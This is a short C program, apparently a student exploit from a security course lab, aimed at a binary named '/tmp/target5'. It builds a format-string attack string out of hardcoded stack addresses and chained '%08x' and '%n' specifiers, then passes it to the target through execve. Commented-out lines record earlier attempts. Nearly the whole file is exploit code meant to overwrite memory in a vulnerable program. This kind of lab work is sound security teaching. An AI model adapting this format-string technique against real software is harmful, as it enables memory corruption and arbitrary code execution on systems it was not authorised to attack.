#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  int i;
  char *args[3];
  char *env[1];
  char buf[50];
  memset(buf, 0x90, 50);

  //strncpy(buf, "\x50\xfb\xff\xbf%08x%08x%08x%n", 18); 
  strncpy(buf, "\x3c\xfe\xff\xbf\x3d\xfe\xff\xbf\x3e\xfe\xff\xbf\x3f\xfe\xff\xbf%08x%08x%08x%n%n%n%n", 36);
  //for(i = 0; i < 113; i++) {
    //strncpy(buf+4+(i*4), "%08x", 4); 
  //}
  
  //strncpy(buf+305, "%n", 2);
  
  //strncpy(buf+240, "\x70", 1);
  //strncpy(buf+236, "\x08\xfd\xff\xbf", 4);
  //strncpy(buf+244, "\x12\x34\x56\x78", 4);
  
  args[0] = TARGET; 
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
